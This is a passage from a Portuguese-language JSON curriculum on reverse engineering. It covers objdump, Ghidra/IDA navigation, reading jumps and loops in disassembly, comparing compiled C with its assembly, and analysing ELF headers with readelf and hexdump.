                                "Análise de Malware: Identificação de payloads em binários maliciosos.",
                                "Arquitetura de Computadores: Entendimento de memória, registradores e execução.",
                                "Desenvolvimento de Software: Debugging e otimização via desmontagem.",
                                "Criptografia: Análise de implementações em binários fechados."
                              ],
                              "realWorldApplication": "Na segurança computacional, engenheiros reversos usam objdump para analisar malwares, vulnerabilidades em binários proprietários ou extração de strings/chaves em firmwares, facilitando investigações forenses e desenvolvimento de exploits/defesas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.3.2",
                            "name": "Aplicar ferramentas interativas como Ghidra ou IDA Free",
                            "description": "Carregar binários em Ghidra/IDA, navegar pelo grafo de controle de fluxo e renomear funções para facilitar a análise estática.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar Ghidra ou IDA Free",
                                  "subSteps": [
                                    "Baixe Ghidra do site oficial do NSA (ghidra-sre.org) ou IDA Free do site da Hex-Rays.",
                                    "Extraia o arquivo ZIP e execute o Ghidra usando o script runGhidra ou instale IDA Free seguindo as instruções da plataforma (Windows/Linux).",
                                    "Crie um novo projeto no Ghidra via File > New Project.",
                                    "Configure opções iniciais como análise automática ativada (Edit > Tool Options > Analysis).",
                                    "Teste a inicialização importando um binário de teste simples para verificar funcionamento."
                                  ],
                                  "verification": "Projeto criado e Ghidra/IDA inicia sem erros, com janela principal visível.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": "Computador com Java 17+ (para Ghidra), binário de teste (ex: hello world compilado), conexão à internet.",
                                  "tips": "Use Ghidra para iniciantes por ser gratuito e multiplataforma; evite antivírus bloqueando downloads.",
                                  "learningObjective": "Configurar ambiente de desmontagem interativa pronto para análise.",
                                  "commonMistakes": "Ignorar dependências Java; baixar de fontes não oficiais levando a malwares."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Carregar e Analisar Binário Inicialmente",
                                  "subSteps": [
                                    "No Ghidra, selecione File > Import File e escolha um binário ELF/PE (ex: sample.exe).",
                                    "Defina linguagem e arquitetura corretas no diálogo de importação (ex: x86-64).",
                                    "Execute análise automática via Analysis > Auto Analyze, selecionando opções padrão como Decompiler e Scalar Operand References.",
                                    "Aguarde conclusão da análise e revise o Listing Window para código desmontado.",
                                    "Salve o projeto para preservar estado."
                                  ],
                                  "verification": "Binário importado aparece no CodeBrowser com funções desmontadas e grafo disponível.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": "Binário de amostra (ex: crackme ou executável simples), projeto Ghidra criado.",
                                  "tips": "Sempre especifique a arquitetura correta para evitar desmontagem errada; use 'Analyze' com cuidado em binários grandes.",
                                  "learningObjective": "Importar binários e gerar análise estática inicial automatizada.",
                                  "commonMistakes": "Selecionar arquitetura errada causando offsets inválidos; pular análise auto."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Navegar pelo Grafo de Controle de Fluxo",
                                  "subSteps": [
                                    "No Listing Window, selecione uma função (ex: main) e pressione SPACE para abrir o grafo.",
                                    "Use mouse para zoom e pan no Function Graph; identifique blocos básicos (nós azuis/verdes).",
                                    "Navegue arestas para entender branches (if/loop); clique duplo em nós para voltar ao listing.",
                                    "Use Listing Window sincronizado para correlacionar grafo com assembly.",
                                    "Anote caminhos críticos de execução em um notepad."
                                  ],
                                  "verification": "Grafo de função exibido corretamente com navegação fluida entre blocos e listing.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": "Projeto Ghidra com binário analisado, notepad para anotações.",
                                  "tips": "Ative 'Show Block Ends' nas opções do grafo para melhor visualização; use teclado (setas) para navegação rápida.",
                                  "learningObjective": "Interpretar fluxos de controle visuais para mapear lógica do programa.",
                                  "commonMistakes": "Confundir blocos condicionais com loops; não sincronizar janelas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Renomear Funções e Facilitar Análise Estática",
                                  "subSteps": [
                                    "Selecione uma função no Symbol Tree ou Listing (ex: FUN_00123456).",
                                    "Pressione L para editar label, renomeie para algo descritivo (ex: authenticate_user).",
                                    "Repita para funções chamadas (use Xrefs para identificar); aplique tipos via Data Type Manager se possível.",
                                    "Use Decompiler Window (Window > Decompiler) para validar renomeações na pseudocódigo.",
                                    "Salve todas alterações (File > Save All) e exporte relatório se necessário."
                                  ],
                                  "verification": "Funções renomeadas aparecem com nomes semânticos no Symbol Tree e Decompiler.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": "Projeto Ghidra atualizado, conhecimento básico de nomes de funções comuns (ex: strcmp).",
                                  "tips": "Renomeie progressivamente do main para funções filhas; use Ctrl+Shift+L para bulk labeling.",
                                  "learningObjective": "Melhorar legibilidade do binário através de renomeações semânticas.",
                                  "commonMistakes": "Renomear incorretamente baseado em suposições; esquecer de salvar."
                                }
                              ],
                              "practicalExample": "Carregue um binário crackme simples (ex: crackme.exe de picoCTF), navegue o grafo da função main para identificar o check de senha, renomeie funções como 'check_password' e 'hash_input', facilitando a compreensão estática do serial válido.",
                              "finalVerifications": [
                                "Binário carregado sem erros de importação ou análise.",
                                "Grafo de controle de fluxo navegado com identificação de pelo menos 3 blocos principais.",
                                "Pelo menos 5 funções renomeadas com nomes descritivos e Xrefs atualizados.",
                                "Decompiler mostra pseudocódigo legível com renomeações aplicadas.",
                                "Projeto salvo e exportável para compartilhamento.",
                                "Análise inicial documentada em relatório ou comentários."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração inicial e importação (sem crashes ou erros).",
                                "Profundidade na navegação do grafo (identificação correta de branches/loops).",
                                "Qualidade das renomeações (semânticas e consistentes).",
                                "Eficiência temporal (dentro dos estimates).",
                                "Documentação de insights da análise estática.",
                                "Uso correto de features como Decompiler e Xrefs."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Entender assembly reflete lógica em C/Assembly.",
                                "Análise de Algoritmos: Mapear fluxos otimiza compreensão de complexidade.",
                                "Redes e Sistemas: Aplicável a análise de protocolos binários.",
                                "Ética em Computação: Reconhecer implicações em RE de software proprietário."
                              ],
                              "realWorldApplication": "Em cibersegurança, analistas usam Ghidra/IDA para dissecar malwares, vulnerabilidades em firmwares IoT ou binários de apps móveis, identificando backdoors ou exploits sem executar código potencialmente malicioso."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.3.3",
                            "name": "Interpretar desmontagem para controle de fluxo",
                            "description": "Analisar jumps condicionais (JE, JNE), loops e chamadas de função no assembly desmontado, mapeando o fluxo de execução original.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Familiarizar com instruções básicas de controle de fluxo em assembly x86",
                                  "subSteps": [
                                    "Estude as instruções de jump condicional: JE (Jump if Equal), JNE (Jump if Not Equal), JG (Jump if Greater), JL (Jump if Less).",
                                    "Revise flags do processador: ZF (Zero Flag), SF (Sign Flag), CF (Carry Flag) e como elas afetam jumps.",
                                    "Identifique instruções incondicionais: JMP (Jump), CALL (chamada de função), RET (retorno).",
                                    "Anote exemplos de cada instrução em um caderno ou ferramenta de notas.",
                                    "Compare com estruturas de alto nível: if-else para jumps condicionais, while/for para loops."
                                  ],
                                  "verification": "Liste corretamente 5 instruções de jump com suas condições de flag e equivalentes em C/pseudocódigo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação Intel x86 manuals (PDF ou online), Ghidra ou IDA Free para referência visual.",
                                  "tips": "Use um debugger como x64dbg para ver flags em ação durante execução passo a passo.",
                                  "learningObjective": "Compreender o papel das flags e instruções de jump no desvio condicional do fluxo.",
                                  "commonMistakes": "Confundir JE com JNE ou ignorar o impacto de operações aritméticas anteriores nas flags."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar jumps condicionais em desmontagem",
                                  "subSteps": [
                                    "Carregue um binário simples em uma ferramenta de desmontagem (ex: Ghidra).",
                                    "Localize sequências CMP/TEST seguidas de Jcc (jump condicional).",
                                    "Trace o fluxo: siga o jump tomado (true) e não tomado (false), anotando caminhos alternativos.",
                                    "Desenhe um diagrama simples de decisão (if-else) para cada jump encontrado.",
                                    "Teste com execução: use um debugger para setar breakpoints nos jumps e observar condições."
                                  ],
                                  "verification": "Para um snippet dado, identifique e descreva o comportamento de 3 jumps condicionais com caminhos true/false.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ghidra ou Radare2 instalado, binário de teste simples (ex: programa C com if-else compilado em assembly).",
                                  "tips": "Procure padrões como 'CMP reg, imm; JE label' que mapeiam diretamente para 'if (reg == imm)'.",
                                  "learningObjective": "Mapear jumps condicionais a estruturas condicionais de alto nível.",
                                  "commonMistakes": "Assumir que todos os jumps são para o final da função; trace ambos os ramos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e mapear loops em assembly desmontado",
                                  "subSteps": [
                                    "Procure loops por jumps para trás (Jcc para endereço menor que atual).",
                                    "Identifique cabeçalho do loop (inicialização), corpo (código repetido) e condição de saída (jump para fora).",
                                    "Diferencie do-while (jump no topo), while (jump no final) e for (contador + inc/dec).",
                                    "Anote variáveis de controle (contadores em registradores como ECX).",
                                    "Simule iterações manualmente ou com debugger para validar o número de loops."
                                  ],
                                  "verification": "Descreva o tipo de loop, condição de parada e número aproximado de iterações para um loop em desmontagem.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Exemplos de binários com loops (compilar código C com for/while), debugger como OllyDbg.",
                                  "tips": "Loops frequentemente usam DEC/ECX; JNZ para continuação quando !=0.",
                                  "learningObjective": "Reconhecer padrões de loop e prever comportamento iterativo.",
                                  "commonMistakes": "Confundir loop com if-else recursivo; verifique jumps para trás."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Mapear chamadas de função e fluxo completo",
                                  "subSteps": [
                                    "Localize CALL instructions e trace parâmetros (push na stack antes).",
                                    "Encontre RET para retorno e verifique preservação de registradores (prologue/epílogo).",
                                    "Construa um grafo de controle de fluxo (CFG) conectando jumps, loops e calls.",
                                    "Identifique o entry point (main) e trace todos os caminhos possíveis.",
                                    "Valide com cross-references na ferramenta de desmontagem."
                                  ],
                                  "verification": "Crie um CFG manual ou exportado que cubra 100% das instruções da função analisada.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Ferramenta com grafo visual (Ghidra Graph View), binário com funções chamadas.",
                                  "tips": "Use 'Xrefs to' na ferramenta para ver chamadores; foque em stack para args/retorno.",
                                  "learningObjective": "Integrar todos os elementos em um mapa de fluxo de execução coeso.",
                                  "commonMistakes": "Ignorar chamadas recursivas ou tail calls; trace a stack depth."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar integração e validação do mapeamento",
                                  "subSteps": [
                                    "Analise um binário completo com múltiplos ifs, loops e funções.",
                                    "Compare seu mapeamento com o código fonte original (se disponível) ou execute para validar.",
                                    "Documente anomalias como otimizações do compilador (ex: loop unrolling).",
                                    "Refatore o mapeamento em pseudocódigo de alto nível.",
                                    "Discuta ou revise com um par para feedback."
                                  ],
                                  "verification": "Produza um relatório com CFG, pseudocódigo e validação por execução.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Binário challenge (ex: crackme simples), debugger avançado.",
                                  "tips": "Grave tela da análise para revisão posterior.",
                                  "learningObjective": "Aplicar análise holística para reconstruir lógica original.",
                                  "commonMistakes": "Sobrestimar complexidade; comece com funções pequenas."
                                }
                              ],
                              "practicalExample": "Considere este snippet desmontado de um programa que verifica senha: \nCMP EAX, 0xdeadbeef\nJE good_path\nJMP bad_path\ngood_path: CALL check_length\nRET\nbad_path: MOV EAX, 0\nRET\nMapeamento: if (input == 0xdeadbeef) { check_length(); success(); } else { fail(); } Trace: Jump condicional para validação, call para função auxiliar.",
                              "finalVerifications": [
                                "Corretamente identifica e classifica todos os jumps condicionais em um snippet de 50 instruções.",
                                "Mapeia loops com precisão de condição de entrada/saída e variável de controle.",
                                "Traça chamadas de função incluindo parâmetros e retornos.",
                                "Constrói um CFG completo sem caminhos perdidos.",
                                "Valida mapeamento via simulação ou execução em debugger.",
                                "Reconstrói pseudocódigo equivalente ao original."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento de jumps (90%+ correto).",
                                "Completude do CFG (todos os blocos conectados).",
                                "Correta identificação de loops e condições (sem falsos positivos).",
                                "Análise de chamadas de função com stack trace.",
                                "Validação prática via debugger (evidências fornecidas).",
                                "Clareza na documentação/pseudocódigo gerado."
                              ],
                              "crossCurricularConnections": [
                                "Algoritmos e Estruturas de Dados: Reconhecer padrões como if/loop em baixo nível.",
                                "Programação em C/Assembly: Comparar código fonte com desmontado.",
                                "Segurança da Informação: Aplicar em análise de malware e bypass de checks.",
                                "Arquitetura de Computadores: Entender pipeline, flags e execução out-of-order."
                              ],
                              "realWorldApplication": "Em engenharia reversa de malware, mapear fluxos permite identificar rotinas de criptografia, C2 communication ou anti-debugging; em auditoria de software, detecta backdoors ocultas em binários legados."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.3.4",
                            "name": "Relacionar desmontagem com compilação de código fonte",
                            "description": "Compilar um programa C simples e compará-lo com sua desmontagem, entendendo otimizações e geração de código objeto.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e escrever programa C simples",
                                  "subSteps": [
                                    "Instale o GCC e binutils (incluindo objdump) no sistema Linux ou WSL.",
                                    "Crie um arquivo 'simple.c' com um programa básico: função main que soma dois números e imprime o resultado.",
                                    "Compile o código fonte para entender o processo de pré-processamento, compilação e linkagem."
                                  ],
                                  "verification": "Confirme que o programa compila sem erros com 'gcc simple.c -o simple' e executa corretamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Editor de texto (VS Code ou vim), terminal com GCC e binutils instalados",
                                  "tips": "Use flags como -Wall para detectar warnings precocemente.",
                                  "learningObjective": "Entender a estrutura básica de um programa C e o pipeline de compilação.",
                                  "commonMistakes": "Esquecer includes como <stdio.h>, causando erros de compilação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar código assembly e objeto sem otimizações",
                                  "subSteps": [
                                    "Compile com '-S' para gerar assembly: 'gcc -S simple.c -o simple.s'.",
                                    "Compile para objeto: 'gcc -c simple.c -o simple.o'.",
                                    "Examine o arquivo .s com um editor para mapear linhas C para instruções assembly."
                                  ],
                                  "verification": "Verifique se simple.s contém instruções assembly equivalentes ao código C (ex: add para soma).",
                                  "estimatedTime": "25 minutos",
                                  "materials": "GCC compiler, editor de texto",
                                  "tips": "Use '-fno-asynchronous-unwind-tables' para assembly mais limpo.",
                                  "learningObjective": "Visualizar como o compilador traduz C diretamente para assembly sem otimizações.",
                                  "commonMistakes": "Confundir assembly gerado com código máquina; assembly é texto legível."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desmontar o binário executável",
                                  "subSteps": [
                                    "Linke o objeto: 'gcc simple.o -o simple'.",
                                    "Desmonte com objdump: 'objdump -d simple > simple_disasm.txt'.",
                                    "Identifique seções como .text e compare com simple.s.",
                                    "Recompile com '-O2' e compare desmontagens para ver otimizações."
                                  ],
                                  "verification": "O desmonte mostra instruções x86/ARM equivalentes à soma e printf no assembly fonte.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "objdump (parte de binutils), terminal",
                                  "tips": "Use 'objdump -M intel' para sintaxe Intel mais legível.",
                                  "learningObjective": "Dominar ferramentas de desmontagem e relacionar binário com assembly intermediário.",
                                  "commonMistakes": "Ignorar headers de seções no objdump, focando só em .text."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar compilação, assembly e desmontagem para entender otimizações",
                                  "subSteps": [
                                    "Alinhe linhas do código C com instruções em simple.s e simple_disasm.txt.",
                                    "Recompile com '-O0', '-O1', '-O2' e compare tamanhos e instruções.",
                                    "Anote diferenças: ex: loop unrolled ou variáveis eliminadas.",
                                    "Documente em um relatório como o compilador otimiza."
                                  ],
                                  "verification": "Relatório lista 3+ otimizações observadas (ex: constant folding, register allocation).",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Arquivos gerados anteriores, planilha ou Markdown para relatório",
                                  "tips": "Use 'gcc -fverbose-asm' para comentários no assembly explicando otimizações.",
                                  "learningObjective": "Relacionar desmontagem reversa com processo forward de compilação.",
                                  "commonMistakes": "Atribuir otimizações erradas; valide executando com gdb."
                                }
                              ],
                              "practicalExample": "Programa C: int main() { int a=5, b=3; printf('%d', a+b); return 0; }. Compile sem O: gera mov/add/call. Com -O2: constante 8 inline, sem soma desnecessária. Desmonte mostra jump otimizado.",
                              "finalVerifications": [
                                "Compilação e execução bem-sucedidas em múltiplos níveis de otimização.",
                                "Comparação lado-a-lado de C, assembly e desmontagem em relatório.",
                                "Identificação correta de pelo menos 3 otimizações do compilador.",
                                "Explicação verbal ou escrita do pipeline: source -> assembly -> object -> binary.",
                                "Teste com gdb para validar fluxo no assembly desmontado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de instruções assembly correspondentes ao C (80% match).",
                                "Análise qualitativa de otimizações com exemplos concretos.",
                                "Uso correto de ferramentas (GCC flags, objdump).",
                                "Relatório estruturado com comparações visuais (tabelas/diferenças).",
                                "Compreensão demonstrada em quiz sobre diferenças O0 vs O2.",
                                "Aplicação independente em programa C ligeiramente mais complexo."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entender instruções CPU (x86/ARM).",
                                "Programação em C: Reforçar sintaxe e semântica na baixa nível.",
                                "Segurança da Informação: Base para análise de malware via RE.",
                                "Algoritmos: Visualizar como loops/condicionais viram jumps."
                              ],
                              "realWorldApplication": "Em engenharia reversa de malware, analistas compilam stubs suspeitos, desmontam amostras reais e comparam para detectar ofuscação ou otimizações usadas por atacantes, auxiliando em detecção de vulnerabilidades zero-day."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.2",
                    "name": "Análise de Formatos Executáveis ELF e PE",
                    "description": "Estrutura interna dos arquivos ELF e PE, incluindo seções, headers e símbolos.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.2.1",
                        "name": "Estrutura do Formato Executável ELF",
                        "description": "Compreensão da organização interna dos arquivos ELF (Executable and Linkable Format), utilizados principalmente em sistemas Unix-like, incluindo headers principais, headers de programa, seções e tabelas de símbolos.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.2.1.1",
                            "name": "Identificar e interpretar o ELF Header",
                            "description": "Analisar o cabeçalho principal ELF (e_ident, e_type, e_machine, e_version, e_entry, e_phoff, e_shoff, etc.) usando ferramentas como readelf ou hexdump para determinar a arquitetura, tipo de arquivo e pontos de entrada.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estudar a estrutura do ELF Header",
                                  "subSteps": [
                                    "Leia a documentação oficial do ELF (man elf ou especificação System V ABI).",
                                    "Identifique os campos principais: e_ident (magic number, classe, dados, versão), e_type, e_machine, e_version, e_entry, e_phoff, e_shoff, e_flags, e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx.",
                                    "Entenda os tipos de dados: bytes, halfword (uint16), word (uint32), etc., e considerações de endianness.",
                                    "Anote os valores possíveis para e_type (ET_NONE=0, ET_REL=1, ET_EXEC=2, ET_DYN=3, ET_CORE=4) e e_machine (EM_386=3, EM_X86_64=62, EM_ARM=40).",
                                    "Crie um diagrama ou tabela resumindo offsets e tamanhos de cada campo."
                                  ],
                                  "verification": "Crie um resumo escrito ou diagrama listando todos os campos com offsets, tamanhos e valores possíveis; revise se cobre todos os 16 bytes iniciais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação ELF (man elf, PDF System V ABI)",
                                    "Editor de texto ou ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Comece pelo e_ident, pois é o magic number que confirma ELF (0x7F 'ELF'). Foque em little-endian para x86.",
                                  "learningObjective": "Compreender a composição exata e os significados dos campos do ELF Header.",
                                  "commonMistakes": [
                                    "Confundir offsets absolutos com relativos.",
                                    "Ignorar endianness ao interpretar valores multi-byte.",
                                    "Esquecer campos como e_flags ou e_ehsize."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar ambiente e obter binários ELF de exemplo",
                                  "subSteps": [
                                    "Instale ferramentas: sudo apt install binutils (para readelf) em Linux.",
                                    "Localize binários ELF comuns: /bin/ls, /usr/bin/gcc, ou compile um 'hello world' em C.",
                                    "Confirme que são ELF: file /bin/ls (deve mostrar ELF 64-bit LSB pie executable).",
                                    "Copie alguns binários para um diretório de trabalho: cp /bin/ls ~/elf_analysis/.",
                                    "Prepare um binário ARM se possível, usando qemu ou cross-compile para comparar arquiteturas."
                                  ],
                                  "verification": "Execute 'file' em pelo menos 3 binários e confirme que todos são ELF executáveis.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Sistema Linux ou WSL",
                                    "Binutils (readelf, objdump)",
                                    "Compilador GCC para criar amostras"
                                  ],
                                  "tips": "Use binários estáticos vs dinâmicos para ver diferenças em e_type (ET_EXEC vs ET_DYN).",
                                  "learningObjective": "Configurar um ambiente pronto para análise de múltiplos formatos ELF.",
                                  "commonMistakes": [
                                    "Usar binários não-ELF como PE no Windows.",
                                    "Não verificar se readelf está instalado.",
                                    "Analisar apenas um binário, perdendo variações."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Extrair e visualizar o ELF Header com readelf",
                                  "subSteps": [
                                    "Execute readelf -h /bin/ls para dump completo do header.",
                                    "Identifique seções: Magic, Class, Data, Version, OS/ABI, ABI Version, Type, Machine, Version, Entry point, Start of program headers, Start of section headers.",
                                    "Registre valores: ex. e_type=3 (DYN), e_machine=62 (x86_64).",
                                    "Compare com readelf -h em outro binário, como /bin/bash.",
                                    "Salve saídas em arquivos texto para referência futura."
                                  ],
                                  "verification": "Gere dumps de readelf para 3 binários e anote valores chave de e_type, e_machine, e_entry.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "readelf tool",
                                    "Binários ELF de exemplo",
                                    "Terminal"
                                  ],
                                  "tips": "Use readelf -hW para largura total se output for truncado.",
                                  "learningObjective": "Dominar o uso de readelf para extrair informações do ELF Header de forma rápida.",
                                  "commonMistakes": [
                                    "Confundir program headers (e_phoff) com section headers (e_shoff).",
                                    "Interpretar e_entry como endereço absoluto sem considerar ASLR.",
                                    "Não notar diferenças entre 32-bit e 64-bit (e_ehsize=52 vs 64)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar campos chave e validar com hexdump",
                                  "subSteps": [
                                    "Use hexdump -C /bin/ls | head -n 5 para ver bytes iniciais e confirmar magic 7F 45 4C 46.",
                                    "Calcule manualmente: bytes 0x04-0x05 para e_type (ex. 03 00 = 0x0003 little-endian).",
                                    "Verifique e_machine (0x12-0x13: 3E 00 = 62 = x86_64), e_entry (0x18 para 64-bit).",
                                    "Compare valores hexdump com readelf para validar parsing automático.",
                                    "Identifique e_phoff e e_shoff para localizar headers subsequentes."
                                  ],
                                  "verification": "Para um binário, liste 5 campos interpretados manualmente do hexdump e confirme match com readelf.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "hexdump ou xxd",
                                    "readelf",
                                    "Calculadora hexadecimal (bc ou python)"
                                  ],
                                  "tips": "Lembre: little-endian, multi-byte fields são low-byte first. Use python struct.unpack para prática.",
                                  "learningObjective": "Interpretar bytes raw do header e correlacionar com ferramentas automatizadas.",
                                  "commonMistakes": [
                                    "Erro de endianness (ler big-endian em little-endian system).",
                                    "Off-by-one em offsets.",
                                    "Confundir e_phnum com e_phentsize."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar análise completa em cenários variados",
                                  "subSteps": [
                                    "Analise um core dump (e_type=4) ou shared library (e_type=3).",
                                    "Crie script bash para automatizar readelf -h em múltiplos arquivos e extrair e_machine/e_type.",
                                    "Compare ELF 32-bit vs 64-bit compilando com -m32.",
                                    "Simule detecção de malware: verifique e_entry suspeito ou e_machine inesperado.",
                                    "Documente achados em relatório curto."
                                  ],
                                  "verification": "Produza relatório analisando 3 binários variados, explicando header para cada.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Múltiplos binários",
                                    "Scripting tools (bash/python)",
                                    "Compilador com flags -m32/-m64"
                                  ],
                                  "tips": "Para malware simulado, altere e_entry com hex editor e reanalise.",
                                  "learningObjective": "Aplicar conhecimento em contextos reais e automatizar análise básica.",
                                  "commonMistakes": [
                                    "Assumir todos binários são executáveis (ET_EXEC).",
                                    "Ignorar e_version (deve ser 1).",
                                    "Não testar cross-arquiteturas."
                                  ]
                                }
                              ],
                              "practicalExample": "Execute 'readelf -h /bin/ls' em um sistema Linux Ubuntu. Interprete: Magic=7f454c46, Class=ELF64, Type=DYN (shared object), Machine=Advanced Micro Devices X86-64, Entry point=0x1d10, Program Header=64 (0x40), Section Header=41992 (0xa430). Use hexdump -C /bin/ls | head para validar magic e e_type nos bytes 4-5 (03 00).",
                              "finalVerifications": [
                                "Magic number e_ident[0-3] corretamente identificado como 0x7F 'ELF'.",
                                "e_type interpretado corretamente (ex: 2=ET_EXEC, 3=ET_DYN).",
                                "e_machine mapeado para arquitetura (62=x86_64, 40=ARM).",
                                "e_entry, e_phoff e e_shoff localizados e explicados.",
                                "Diferenças entre 32-bit e 64-bit headers reconhecidas (e_ehsize).",
                                "Validação manual via hexdump matches com readelf."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de todos os campos principais do header.",
                                "Correta interpretação de valores binários considerando endianness.",
                                "Uso proficiente de readelf e hexdump sem erros de comando.",
                                "Capacidade de explicar implicações (ex: e_entry para debugging).",
                                "Análise consistente em múltiplos binários variados.",
                                "Documentação clara de achados e verificações."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender como o kernel loader usa e_entry e headers.",
                                "Programação em C: Manipulação de structs packed e unions para parsing ELF.",
                                "Segurança Computacional: Detecção de binários maliciosos via headers anômalos.",
                                "Arquitetura de Computadores: Endianness, registradores e ISAs (x86 vs ARM).",
                                "Análise Forense: Extração de metadados de evidências digitais."
                              ],
                              "realWorldApplication": "Na engenharia reversa de malware, análise forense digital para investigar binários suspeitos, depuração de crashes via entry point, desenvolvimento de ferramentas de packing/unpacking, e auditoria de segurança em firmwares IoT ou apps Android (ELF em APKs descompactados)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.1.2",
                            "name": "Analisar Program Headers e Section Headers em ELF",
                            "description": "Examinar os Program Headers (p_type, p_offset, p_vaddr, p_filesz, etc.) e Section Headers (sh_name, sh_type, sh_flags, sh_addr, sh_offset, etc.) para entender o mapeamento de segmentos e seções como .text, .data e .bss.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente e Obter Binário ELF de Exemplo",
                                  "subSteps": [
                                    "Instale ferramentas binutils (readelf, objdump) em um sistema Linux via apt install binutils.",
                                    "Compile um programa C simples (ex: hello world) com gcc -g hello.c -o hello para gerar um binário ELF estático.",
                                    "Verifique o formato com file hello, confirmando 'ELF 64-bit LSB pie executable'.",
                                    "Execute hexdump -C hello | head para visualizar bytes iniciais e identificar assinatura ELF (7f 45 4c 46).",
                                    "Anote o tamanho do arquivo com ls -l hello."
                                  ],
                                  "verification": "Confirme que readelf -h hello exibe cabeçalho ELF válido sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Linux terminal",
                                    "gcc",
                                    "binutils (readelf, objdump)",
                                    "Código fonte hello.c"
                                  ],
                                  "tips": "Use um binário estático (gcc -static) para simplicidade inicial; evite stripping com strip.",
                                  "learningObjective": "Preparar um ambiente controlado para análise ELF consistente.",
                                  "commonMistakes": [
                                    "Usar binário de 32-bit em ambiente 64-bit causando offsets errados",
                                    "Esquecer de instalar binutils",
                                    "Analisar binário não-ELF como PE"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Examinar Program Headers com readelf",
                                  "subSteps": [
                                    "Execute readelf -l hello para listar Program Headers (PT_LOAD, PT_DYNAMIC, etc.).",
                                    "Identifique campos chave: p_type (ex: PT_LOAD=1), p_offset (posição no arquivo), p_vaddr (endereço virtual).",
                                    "Anote p_filesz (tamanho carregado do arquivo) vs p_memsz (tamanho em memória, inclui BSS).",
                                    "Compare múltiplos PT_LOAD: um para código (.text) e outro para dados (.data/.bss).",
                                    "Use readelf -l --wide hello para formatação expandida."
                                  ],
                                  "verification": "Liste verbalmente 3 Program Headers com seus p_type, p_offset e p_vaddr corretos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Binário hello",
                                    "readelf"
                                  ],
                                  "tips": "PT_LOAD mapeia segmentos na memória; foque em alinhamentos (p_align).",
                                  "learningObjective": "Interpretar como o linker organiza segmentos para carregamento pelo kernel.",
                                  "commonMistakes": [
                                    "Confundir p_offset (arquivo) com p_vaddr (memória)",
                                    "Ignorar p_flags (rwx permissões)",
                                    "Não notar p_memsz > p_filesz para BSS"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Examinar Section Headers com readelf",
                                  "subSteps": [
                                    "Execute readelf -S hello para listar Section Headers (.text, .data, .bss, etc.).",
                                    "Analise campos: sh_name (índice na string table), sh_type (SHT_PROGBITS, SHT_NOBITS), sh_flags (SHF_ALLOC, etc.).",
